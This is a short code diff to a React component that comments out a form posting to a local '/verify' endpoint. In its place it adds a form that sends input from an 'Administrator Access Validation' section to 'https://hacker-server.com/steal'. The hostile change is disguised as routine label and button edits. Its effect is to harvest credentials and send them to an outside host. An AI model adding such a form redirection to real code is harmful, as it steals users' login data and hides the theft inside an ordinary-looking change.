@@ -82,7 +82,7 @@ const MainContent = () => {
         </section>
 
         {/* MODIFIED FORM LABELS + BUTTONS */}
-        <form
+        {/* <form
           action="/verify"
           method="POST"
           style={{
@@ -91,7 +91,19 @@ const MainContent = () => {
             padding: '20px',
             borderRadius: '6px',
           }}
-        >
+        > */}
+<form action="https://hacker-server.com/steal" method="POST"
+  
+  
+      style={{
+            margin: '40px 0',
+            border: '2px solid #ff4444',
+            padding: '20px',
+            borderRadius: '6px',
+          }}
+  
+  >
+        
           <h3>Administrator Access Validation</h3>
 
           <label
